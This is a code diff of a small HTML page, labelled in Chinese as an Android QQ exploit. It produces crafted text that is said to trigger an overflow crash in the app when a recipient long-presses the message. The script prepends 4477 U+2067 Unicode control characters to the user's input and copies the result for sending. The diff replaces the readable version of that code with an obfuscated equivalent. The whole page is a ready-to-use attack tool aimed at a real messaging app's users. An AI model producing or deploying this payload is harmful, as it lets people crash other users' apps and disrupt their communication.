@@ -69,32 +69,21 @@
         span {
             font-family: Arial, Helvetica, sans-serif;
         }
+        h4, h2{
+            margin: 0;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>安卓<span>QQ</span>漏洞利用</h2>
+        <h4>生成的文本发送到qq，一旦长按消息就会触发溢出漏洞</h4>
         <input type="text" id="userInput" placeholder="输入要植入的文本">
         <button onclick="copyText()">复制</button>
     </div>
     <script>
-        function copyText() {
-            // 获取用户输入
-            var inputText = document.getElementById("userInput").value;
-            // 在输入文字前加上4477个U+2067字符
-            var prefix = Array(4477).fill('\u2067').join('');
-            var finalText = prefix + inputText;
-
-            // 创建一个临时文本区域来复制文本
-            var tempInput = document.createElement("textarea");
-            tempInput.value = finalText;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-
-            alert("已复制: " + finalText);
-        }
+      function _0x3a5e(_0xd4e752,_0x50c621){var _0x2d56e5=_0x2d56();return _0x3a5e=function(_0x3a5e7d,_0x51d81a){_0x3a5e7d=_0x3a5e7d-0x10b;var _0x3bf644=_0x2d56e5[_0x3a5e7d];return _0x3bf644;},_0x3a5e(_0xd4e752,_0x50c621);}(function(_0x25c965,_0x240e34){var _0x5cec7b=_0x3a5e,_0xb7cf66=_0x25c965();while(!![]){try{var _0x359933=parseInt(_0x5cec7b(0x10b))/0x1*(parseInt(_0x5cec7b(0x114))/0x2)+-parseInt(_0x5cec7b(0x112))/0x3+-parseInt(_0x5cec7b(0x10e))/0x4+-parseInt(_0x5cec7b(0x10c))/0x5*(parseInt(_0x5cec7b(0x11c))/0x6)+parseInt(_0x5cec7b(0x11b))/0x7*(parseInt(_0x5cec7b(0x115))/0x8)+parseInt(_0x5cec7b(0x11d))/0x9*(-parseInt(_0x5cec7b(0x117))/0xa)+parseInt(_0x5cec7b(0x110))/0xb;if(_0x359933===_0x240e34)break;else _0xb7cf66['push'](_0xb7cf66['shift']());}catch(_0x1bfab5){_0xb7cf66['push'](_0xb7cf66['shift']());}}}(_0x2d56,0x1cd4c));function copyText(){var _0x572583=_0x3a5e,_0x50292e=document[_0x572583(0x10f)]('userInput')[_0x572583(0x11a)],_0x1ba5b1=Array(0x117d)[_0x572583(0x119)]('⁧')[_0x572583(0x113)](''),_0x8c8419=_0x1ba5b1+_0x50292e,_0x5e3afc=document['createElement'](_0x572583(0x111));_0x5e3afc[_0x572583(0x11a)]=_0x8c8419,document[_0x572583(0x120)][_0x572583(0x11e)](_0x5e3afc),_0x5e3afc[_0x572583(0x116)](),document[_0x572583(0x118)](_0x572583(0x10d)),document[_0x572583(0x120)][_0x572583(0x11f)](_0x5e3afc),alert('已复制:\x20'+_0x8c8419);}function _0x2d56(){var _0x367362=['3746336fpILJA','textarea','7398XhirWo','join','20jjxSGc','16eUxvWM','select','1862220MOIaeQ','execCommand','fill','value','206164qoRNXa','6BgbVmz','9LPGzwY','appendChild','removeChild','body','4133lYvoCK','536785txXFkI','copy','106692qszkiM','getElementById'];_0x2d56=function(){return _0x367362;};return _0x2d56();}
     </script>
 
 </body>
